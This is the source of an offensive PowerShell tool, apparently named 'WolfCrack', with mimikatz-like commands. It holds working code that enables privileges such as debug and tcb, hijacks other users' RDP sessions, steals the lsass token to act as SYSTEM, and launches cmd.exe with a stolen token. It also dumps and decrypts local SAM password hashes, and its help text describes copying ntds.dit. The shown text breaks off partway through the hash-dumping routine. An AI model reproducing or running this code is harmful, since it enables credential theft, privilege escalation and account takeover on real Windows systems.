#Add privilege to your current user
Function Privilege($mode)
{
<#
.SYNOPSIS
add privileges to your user account, you can watch it with: whoami /priv


.Description
this function adds privileges to your user, the following one can be chosen:
tcb, security, driver, backup, restore, debug, system

.EXAMPLE
 Add debug privilege to your user
WolfCrack # privilege::debug

#>

    $privilege = @"
    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int RtlAdjustPrivilege(ulong Privilege, bool Enable, bool CurrentThread,ref bool Enabled);
"@
    $target = $null
    switch($mode)
    {
        "tcb"      {$target = 7}
        "security" {$target = 8}
        "driver"   {$target = 10}
        "backup"   {$target = 17}
        "restore"  {$target = 18}
        "debug"    {$target = 20}
        "system"   {$target = 22}
        default    {Write-Host "This Option Does Not Exist!!(write 'help::privilege' for help)"}
    }

    Add-Type -MemberDefinition $privilege -Name "Enable" -Namespace "Privilege"

    $res = [Privilege.Enable]::RtlAdjustPrivilege($target,$true,$false,[ref]$false)
    if($res){Write-Host "[x] Error, You Must Be Administrator For That" -ForegroundColor Red}
    else{Write-Host "[*] Privilege '$target' OK" -ForegroundColor Green}
}

Function ts($option)
{
<#
.SYNOPSIS
manipulating rdp sessions


.Description
*** You Must Have System Privileges in order to Take Control Over Rdp Session ***
this function manipulates rdp sessions and can do the following:
1) see all the users connected to the system(session name, sessions id, user)
2) take control over rdp session of another user


.EXAMPLE
see all sessions on the server
WolfCrack # ts::sessions

.EXAMPLE
take control over rdp session id 2
WolfCrack # ts::remote /id:2
#>

    #Get all the sessions on this pc
    Function ts-sessions
    {
        $tasks = tasklist /v /FO CSV
        #all the lines except the first one because it does not contain information about processes
        $tasks = $tasks[1..$tasks.Count]
        $sessions = @()
        $sessionIds = @()
        foreach($task in $tasks)
        {
            $splitted = $task.Split('"')
            $sessionName = $splitted[5]
            $sessionId = $splitted[7]
            $user = $splitted[13]
            $session = New-Object psobject
            try
            {
                if(($user -notmatch "N/A") -and ($user -notmatch "NT AUTHORITY") -and ($user -notmatch "Window Manager"))
                {
                    Add-Member -InputObject $session -MemberType NoteProperty -Name "User" -Value $user
                    Add-Member -InputObject $session -MemberType NoteProperty -Name "SessionName" -Value $sessionName
                    Add-Member -InputObject $session -MemberType NoteProperty -Name "SessionId" -Value $sessionId
                    if($session.SessionId -notin $sessionIds)
                    {
                        $sessionIds += $session.SessionId 
                        $sessions += $session
                    }
                }
            }
            catch{continue}
        }
        
        foreach($session in $sessions)
        {
            $to_print = "`nUser: " + $session.User + "`nSession Name: " + $session.SessionName + "`nSession Id: " + $session.SessionId 
            Write-Host $to_print
        }
    }

    #take control of another remote session
    Function ts-remote($target)
    {
        #in order to work you need to run this as system

        if(!([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM")){token "elevate"|Out-Null}
        $remote = @"
        [DllImport("winsta.dll", SetLastError=true)]
        public static extern bool WinStationConnectW(IntPtr hServer,uint SessionId,uint TargetSessionID,[MarshalAs(UnmanagedType.LPWStr)] string Password ,bool bWait);
"@
        $SERVERHANDLE_CURRENT = New-Object System.IntPtr
        $currentSessionId = (Get-Process -id $pid).SessionId
        $password = ""

        Add-Type -MemberDefinition $remote -Namespace "ts" -Name "remote"

        $res = [ts.remote]::WinStationConnectW($SERVERHANDLE_CURRENT,$target,$currentSessionId,$password,$false)
        if(!($res)){Write-Host "[x] Failed to take over a session (maybe you are not running as system ?)" -ForegroundColor Red}

        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token "revert"|Out-Null}
    }


    $option = $option.split("/")
    switch($option[0])
    {
        "sessions"  {ts-sessions}
        "remote "   {if($option[1] -eq "id"){ts-remote $answer[2]}
                     else{Write-Host "[x] This Option Does Not Exist!!(write 'help::ts' for help)" -ForegroundColor Red}}
        default     {Write-Host "[x] This Option Does Not Exist!!(write 'help::ts' for help)" -ForegroundColor Red}
    }
}


Function token($option)
{
<#
.SYNOPSIS
manipulating tokens


.Description
this function manipulates tokens and can do the following things:
1) see your current tokens name,sid and impersonation type
2) list all the different tokens of processes on your computer
3) elevating your token to one of the tokens you get from the list
4) reverting your token to your normal token


.EXAMPLE
see your current token
WolfCrack # token::whoami

.EXAMPLE
listing all the tokens of process on your computer
WolfCrack # token::list

.EXAMPLE
elevate your token to NT AUTHORITY/SYSTEM
WolfCrack # token::elevate

.EXAMPLE
elevate your token to one of the porcess on the computer, given its PID(for example pid 123)
(normally you will get those pid from the command token::list)

WolfCrack # token::elevate /id:123

.EXAMPLE
running cmd.exe with the given token you have(if elevated it will run with the elevated permissions)
WolfCrack # token::cmd

.EXAMPLE
reverting your token to the one you had before
WolfCrack # token::revert
#>

    $Token = @"

    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle,UInt32 DesiredAccess, out IntPtr TokenHandle);

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups,
        TokenPrivileges,
        TokenOwner,
        TokenPrimaryGroup,
        TokenDefaultDacl,
        TokenSource,
        TokenType,
        TokenImpersonationLevel,
        TokenStatistics,
        TokenRestrictedSids,
        TokenSessionId,
        TokenGroupsAndPrivileges,
        TokenSessionReference,
        TokenSandBoxInert,
        TokenAuditPolicy,
        TokenOrigin
    }

    public enum SECURITY_IMPERSONATION_LEVEL 
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    public enum TOKEN_TYPE 
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SID_AND_ATTRIBUTES
    {
        public IntPtr Sid ;
        public uint Attributes ;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    public struct ProcessInformation
    {
        public IntPtr process;
        public IntPtr thread;
        public int    processId;
        public int    threadId;
    }

    public struct TOKEN_USER
    {
        public SID_AND_ATTRIBUTES User ;
    }

    [DllImport("advapi32", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern bool ConvertSidToStringSid(IntPtr pSID,out IntPtr ptrSid);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);

    [DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,ref SECURITY_ATTRIBUTES lpThreadAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType,out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);

    [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);

"@  
    #Check if type already loaded to memory
    if (-not ([System.Management.Automation.PSTypeName]'Token.Manipulate').Type)
    {
        Add-Type -MemberDefinition $Token -Namespace "Token" -Name "Manipulate"
    }  
    

    $TOKEN_QUERY = 8
    $TOKEN_DUPLICATE = 2
    $TOKEN_IMPERSONATE = 4
    
    #Show information about your current token
    Function token-whoami
    {
        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        if($me.ImpersonationLevel -ne "None"){$to_print=  "`nUserName: " + $me.Name +"`nImpersonationLevel: " + $me.ImpersonationLevel + "`nSid: " + $me.User}
        else{$to_print=  "`nUserName: " + $me.Name +  "`nSid: " + $me.User}
        Write-Host $to_print
    }
    
    #This program loops over all the processes on the pc and return The Users,sids,token type and the id of different process she finds
    Function token-list
    {
        #Gets the user and the Sid of the Token specified
        Function Get-TokenUser($hToken,$SingleToken)
        {
            $TokenPtrSize = 0
            $success = [Token.Manipulate]::GetTokenInformation($hToken,[Token.Manipulate+TOKEN_INFORMATION_CLASS]::TokenUser,0,$TokenPtrSize,[ref]$TokenPtrSize)
            $TokenPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)
            $success = [Token.Manipulate]::GetTokenInformation($hToken,[Token.Manipulate+TOKEN_INFORMATION_CLASS]::TokenUser,$TokenPtr,$TokenPtrSize,[ref]$TokenPtrSize)
            
            $TokenObjectType = New-Object Token.Manipulate+TOKEN_USER
            $TokenObjectType = $TokenObjectType.GetType()
            $token_user = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPtr,[type]$TokenObjectType)
            if($success)
            {
                $SidPtr = [intPtr]::Zero
                $result = [Token.Manipulate]::ConvertSidToStringSid($token_user.User.Sid,[ref]$SidPtr)

                if($result)
                {
                    $sid = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($SidPtr)
                    $objsid = New-Object System.Security.Principal.SecurityIdentifier ("$sid")
                    $objname = $objsid.Translate([System.Security.Principal.NTAccount]).Value

                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPtr)
                    Add-Member -InputObject $SingleToken -MemberType NoteProperty -Name "User" -Value $objname
                    Add-Member -InputObject $SingleToken -MemberType NoteProperty -Name "Sid" -Value $objsid.Value
                }
            }
        }

        #Gets the Type of the token specified
        Function Get-TokenType($hToken,$SingleToken)
        {
            $TokenPtrSize = 0
            $success = [Token.Manipulate]::GetTokenInformation($hToken,[Token.Manipulate+TOKEN_INFORMATION_CLASS]::TokenType,0,$TokenPtrSize,[ref]$TokenPtrSize)
            $token_user = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPtrSize)
            $success = [Token.Manipulate]::GetTokenInformation($hToken,[Token.Manipulate+TOKEN_INFORMATION_CLASS]::TokenType,$token_user,$TokenPtrSize,[ref]$TokenPtrSize)

            if($success)
            {

                $type = [System.Runtime.InteropServices.Marshal]::ReadInt32($token_user)
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($token_user)
                switch($type)
                {
                    1 {$TokenType = "Primary"}
                    2 {$TokenType = "Impersonation"}
                }

                Add-Member -InputObject $SingleToken -MemberType NoteProperty -Name "Type" -Value $TokenType
            }
        }

        $tokens = @()
        $processes = Get-Process
        foreach($process in $processes)
        {
            try
            {
                $hProcess = $process.Handle
                $hToken = New-Object System.IntPtr
                $res = [Token.Manipulate]::OpenProcessToken($hProcess,$TOKEN_QUERY,[ref]$hToken)
                $SingleToken = New-Object psobject
                Add-Member -InputObject $SingleToken -MemberType NoteProperty -Name "PID" -Value $process.Id
                Get-TokenUser $hToken $SingleToken|Out-Null
                Get-TokenType $hToken $SingleToken|Out-Null
                if(($tokens -notcontains $SingleToken) -and "" -ne $SingleToken ){$tokens += $SingleToken}
            }
            catch{}
        }

        $UniqueTokens = @($tokens[0])
        foreach($t in $tokens)
        {
            $res = $true
            foreach($u in $UniqueTokens)
            {
                if($u.User -eq $t.User){$res = $false}
            }
            if($res -and $t.User -ne $null){$UniqueTokens += $t}
        }  

        foreach($u in $UniqueTokens)
        {
            $username = $u.User
            $sid =  $u.Sid
            $type = $u.Type
            $prid = $u.PID
            $to_print = "`nUser: " + $username + "`nSid: " + $sid + "`nType: " + $type + "`nPid: " + $prid
            Write-Host $to_print
        }
    }

    #Impersonating your current token to the Id of the process your specified(default is System)
    Function token-elevate($id)
    {
        if($null -eq $id){$id = (Get-Process -Name lsass).Id}
        $mone = 0

        #Open handle to the token of the process, duplicate it and set the current thread token to the one of the process.
        Function TokenImpersonate($id)
        {
            $process = Get-Process -Id $id
            $hToken = New-Object System.IntPtr
            $res = [Token.Manipulate]::OpenProcessToken($process.Handle,$TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE,[ref]$hToken)
            if(!$res){Write-Host "[x] Failed to OpenToken For given process!!" -ForegroundColor Red}

            $DupToken = New-Object System.IntPtr
            $sa = New-Object Token.Manipulate+SECURITY_ATTRIBUTES
            $sa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($sa)
            $res = [Token.Manipulate]::DuplicateTokenEx($hToken,$TOKEN_QUERY -bor $TOKEN_IMPERSONATE,[ref]$sa,[Token.Manipulate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[Token.Manipulate+TOKEN_TYPE]::TokenImpersonation,[ref]$DupToken)
            if(!$res){Write-Host "[x] Failed to duplicate given token!!" -ForegroundColor Red;$mone ++}

            $res = [Token.Manipulate]::SetThreadToken([IntPtr]::Zero,$DupToken)
            if(!$res){Write-Host "[x] Failed to Set Token For given thread!!" -ForegroundColor Red; $mone ++}
        }

        $prid = (Get-Process -Name lsass).Id
        TokenImpersonate $prid
        TokenImpersonate $id
        if($mone -eq 0){Write-Host "[*] Successfuly impersonated" -ForegroundColor Green}
    }

    Function token-revert
    {
        $res = [Token.Manipulate]::SetThreadToken([System.IntPtr]::Zero,[System.IntPtr]::Zero)
        if(!$res){Write-Host "[x] Failed to Revert token for this process" -ForegroundColor Red}
        else{Write-Host "[*] Successfully reverted" -ForegroundColor Green}
    }
         
    Function token-cmd
    {
        [uint32]$GENERIC_ALL = 0x10000000
        $htoken = [System.Security.Principal.WindowsIdentity]::GetCurrent().Token
        $DupToken = New-Object System.IntPtr
        $sa = New-Object Token.Manipulate+SECURITY_ATTRIBUTES
        $sa.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($sa)


        $si = New-Object Token.Manipulate+STARTUPINFO
        $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
        $pi = New-Object Token.Manipulate+ProcessInformation
        $CREATE_NEW_CONSOLE = 0x00000010
        $processPath = $env:ComSpec # path to cmd.exe

        $res = [Token.Manipulate]::DuplicateTokenEx($htoken,$GENERIC_ALL,[ref]$sa,[Token.Manipulate+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation,[Token.Manipulate+TOKEN_TYPE]::TokenPrimary,[ref]$DupToken)
        if(!$res){Write-Host "[x] Failed to duplicate given token!!" -ForegroundColor Red}

        $res = [Token.Manipulate]::CreateProcessWithTokenW($DupToken,0,$processPath,$null,$CREATE_NEW_CONSOLE,[System.IntPtr]::Zero,"c:\windows\system32",[ref]$si,[ref]$pi)
        if(!$res){Write-Host "[x] Failed to Create Process With Given Token" -ForegroundColor Red}
    }
     
        
    $option = $option.split("/")
    $option[0] = $option[0] -replace '\s',''
    switch($option[0])
    {
        "whoami"  {token-whoami}
        "list"    {token-list}
        "elevate" {if($option[1] -eq "id"){token-elevate $answer[2]}
                   elseif($null -eq $option[1]){token-elevate}
                   else{Write-Host "[x] This Option Does Not Exist!!(write 'help::token' for help)"}}
        "revert"  {token-revert}
        "cmd"     {token-cmd}
        default   {Write-Host "[x] This Option Does Not Exist!!(write 'help::token' for help)"}
    }
}

Function lsadump($option)
{
<#
.SYNOPSIS
dumping sam credentials and ntds credentials


.Description
*** You Must Have System Privileges in order to dump sam creds***
this function dumps hashes of local users on the pc
and if you have system hive and ntds file it will also dump them
(In order to dump ntds you will need a copy of ntds.dit file and the system hive,
in order to get those run this commands:
reg save HKLM\SYSTEM SYSTEM.hiv --> this is for the system hive
and with vssadmin copy the ntds db from c:\windows\ntds\ntds.dit


.EXAMPLE
dumping sam credentials
WolfCrack # lsadump::sam

.EXAMPLE
dumping ntds credentials
wolfCrack # lsadump::ntds /ntds:"c:\users\ntds.dit" /system:"c:\users\system.hiv"
#>

    $dump = @"
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int RegOpenKeyEx(int hKey,string subKey,int ulOptions,int samDesired,out int hkResult);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    public extern static int RegQueryInfoKey(int hkey,StringBuilder lpClass,ref int lpcbClass,int lpReserved,out int lpcSubKeys,out int lpcbMaxSubKeyLen,out int lpcbMaxClassLen,out int lpcValues,out int lpcbMaxValueNameLen,out int lpcbMaxValueLen,out int lpcbSecurityDescriptor,IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(int hKey);
"@
    Add-Type -MemberDefinition $dump -Namespace "lsadump" -Name "sam" -UsingNamespace System.Text

    $odd_parity = @(1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
    )
    
    $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0")
    $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0")
    $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
    $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0)
    
    #Return info about key in registry
    function Get-RegKeyClass([string]$key, [string]$subkey)
    {
        switch ($Key) {
            "HKCR" { $nKey = 0x80000000} #HK Classes Root
            "HKCU" { $nKey = 0x80000001} #HK Current User
            "HKLM" { $nKey = 0x80000002} #HK Local Machine
            "HKU"  { $nKey = 0x80000003} #HK Users
            "HKCC" { $nKey = 0x80000005} #HK Current Config
            default { throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"}
        }

        $KEYQUERYVALUE = 0x1;
        $KEYREAD = 0x19;
        $KEYALLACCESS = 0x3F;
        $result = "";
        [int]$hkey=0
        if (-not [lsadump.sam]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
        {
            $classVal = New-Object Text.Stringbuilder 1024
            [int]$len = 1024
            if (-not [lsadump.sam]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
            {
                $result = $classVal.ToString()
            }
            else{Write-Error "RegQueryInfoKey failed"}   
            [lsadump.sam]::RegCloseKey($hkey) | Out-Null
        }
        else{Write-Error "Cannot open key"}
        return $result
    }

    #return the des keys for the decryption of the hash
    function str_to_key($s)
    {
        $k0 = [int][math]::Floor($s[0] * 0.5)
        $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
        $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
        $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
        $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
        $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
        $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
        $k7 = $($s[6] -band 0x7F)

        $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

        0..7 | %{
            $key[$_] = $odd_parity[($key[$_] * 2)]
        }

        return ,$key
    }

    #using str_to_key to retrieve the des keys from the RID of the user
    function sid_to_key($sid)
    {
        $c0 = $sid -band 255
        $c1 = ($sid -band 65280)/256
        $c2 = ($sid -band 16711680)/65536
        $c3 = ($sid -band 4278190080)/16777216

        $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
        $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

        return ,((str_to_key $s1),(str_to_key $s2))
    }

    #Create RC4 key to encrypt and decrypt
    function NewRC4([byte[]]$key)
    {
        return new-object Object |
        Add-Member NoteProperty key $key -PassThru |
        Add-Member NoteProperty S $null -PassThru |
        Add-Member ScriptMethod init {
            if (-not $this.S)
            {
                [byte[]]$this.S = 0..255;
                0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
            }
        } -PassThru |
        Add-Member ScriptMethod "encrypt" {
            $data = $args[0];
            $this.init();
            $outbuf = new-object byte[] $($data.Length);
            $S2 = $this.S[0..$this.S.Length];
            0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
                $i = ($i+1) % $S2.Length;
                $j = ($j + $S2[$i]) % $S2.Length;
                $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
                $a = $data[$_];
                $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
                $outbuf[$_] = ($a -bxor $b);
            }
            return ,$outbuf;
        } -PassThru
    }

    #create DES key
    function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
    {
        $des = new-object Security.Cryptography.DESCryptoServiceProvider;
        $des.Mode = [Security.Cryptography.CipherMode]::ECB;
        $des.Padding = [Security.Cryptography.PaddingMode]::None;
        $des.Key = $key;
        $des.IV = $key;
        $transform = $null;
        if ($doEncrypt) {$transform = $des.CreateEncryptor();}
        else{$transform = $des.CreateDecryptor();}
        $result = $transform.TransformFinalBlock($data, 0, $data.Length);
        return ,$result;
    }

    #decrypt DES
    function des_decrypt([byte[]]$data, [byte[]]$key)
    {
        return ,(des_transform $data $key $false)
    }

    #encrypt DES
    function des_encrypt([byte[]]$data, [byte[]]$key)
    {
        return ,(des_transform $data $key $true)
    }

    #Create AES key and decrypt data(used for newer versions)
    function DecryptAES([byte[]]$data, [byte[]]$key, $iv=[System.Array]::CreateInstance([byte],16))
    {
        $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros; #Check maybe None
        $AES.BlockSize = 128
        $AES.KeySize = 128
        $AES.IV = $iv
        $AES.Key = $key

        $decryptor = $AES.CreateDecryptor()
        $unencryptedData = $decryptor.TransformFinalBlock($data,0,$data.Length)
        return $unencryptedData
    }

    #Dumping the hashes from the registery
    Function lsadump-sam
    {   
        if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -ne "NT AUTHORITY\SYSTEM"){token "elevate"|Out-Null}

        function Get-BootKey
        {
            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}))
            $b = new-object byte[] $($s.Length/2)
            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
            $b2 = new-object byte[] 16
            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
            return ,$b2;
        }

        #calculate using the bootkey, the hashed boot key
        function Get-HBootKey
        {
            param([byte[]]$bootkey)
            $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")
            $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0")
            $k = Get-Item HKLM:\SAM\SAM\Domains\Account
            if (-not $k) {return $null}
            [byte[]]$F = $k.GetValue("F")
            if (-not $F) {return $null}
            if($F[0] -eq 2)
            {
                $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum)
                $rc4 = NewRC4 $rc4key;
                return ,($rc4.encrypt($F[0x80..0x9F]))
            }

            elseif($F[0] -eq 3)
            {
                return ,(DecryptAES $F[136..151] $bootkey $F[120..135])
            }
        }

        #Retrieve the username who own the hash
        function Get-UserName([byte[]]$V)
        {
            if (-not $V) {return $null};
            $offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
            $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
            return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
        }

        #Retreieve the user hashes
        function Get-UserHashes($u, [byte[]]$hbootkey)
        {
            [byte[]]$enc_lm_hash = $null 
            [byte[]]$enc_nt_hash = $null       

            $global:lmHashLength = [System.BitConverter]::ToInt32($u.V[0xa0..0xa3],0)
            $ntHashLength = [System.BitConverter]::ToInt32($u.V[0xac..0xaf],0)

            if($u.v[[System.BitConverter]::ToInt32($u.V[0xa8..0xab],0) +0xcc +2] -eq 1)
            {
                if ($lmHashLength -eq 20)
                {
                    $lm_hash_offset = [System.BitConverter]::ToInt32($u.V[0x9c..0x9f],0) + 0xcc + 4
                    $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)]
                }

                if ($ntHashLength -eq 20)
                {
                    $nt_hash_offset = [System.BitConverter]::ToInt32($u.V[0xa8..0xab],0) + 0xcc + 4
                    $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)]
                }
                return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $false)
            }
            
            else
            {
                if($lmHashLength -eq 24)
                {
                    $lm_hash_offset = [System.BitConverter]::ToInt32($u.V[0x9c..0x9f],0) + 0xcc + 4
                    $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+$lmHashLength -1)]
                }

                $nt_hash_offset = [System.BitConverter]::ToInt32($u.V[0xa8..0xab],0) + 0xcc + 4
                $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+$ntHashLength -1)]

                return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey $true)
            }
        
        }

        #Decrypt the Hashes of the user
        function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey,[bool]$AES)
        {
            [byte[]]$lmhash = $empty_lm 
            [byte[]]$nthash=  $empty_nt
            # LM Hash
            if ($lmHashLength -ge 20){$lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword $AES}
    
            # NT Hash
            if ($enc_nt_hash){$nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword $AES}
            return ,($lmhash,$nthash)
        }

        #Decrypt Single Hash
        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr,[bool]$AES)
        {
            $deskeys = sid_to_key $rid
            if(!($AES))
            {
                $md5 = [Security.Cryptography.MD5]::Create()
                $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr)
                $rc4 = NewRC4 $rc4_key
                $obfkey = $rc4.encrypt($enc_hash)
            }

            else
            {
                if($enc_hash.Count -gt 24){$obfkey = (DecryptAES $enc_hash[20..51] $hbootkey $enc_hash[4..19])[0..0x0f]}
                else{$obfkey = $null}
            }
        
            if($obfkey -eq $null)
            {
                if([System.Text.Encoding]::ASCII.GetString($lmntstr) -eq [System.Text.Encoding]::ASCII.GetString($almpassword)){$hash = [byte[]]$empty_lm}
                elseif([System.Text.Encoding]::ASCII.GetString($lmntstr) -eq [System.Text.Encoding]::ASCII.GetString($antpassword)){$hash = [byte[]]$empty_nt}
            }
            else
            {
                $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1])
            }

            return ,$hash
        }

        #Get all the userkeys from the registry
        function Get-UserKeys
        {
            ls HKLM:\SAM\SAM\Domains\Account\Users | 
            where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
            Add-Member AliasProperty KeyName PSChildName -PassThru |
            Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
            Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
            Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru 
        }

        #Main Function Start Here!!
        $bootkey = Get-BootKey
        $hbootKey = Get-HBootKey $bootkey
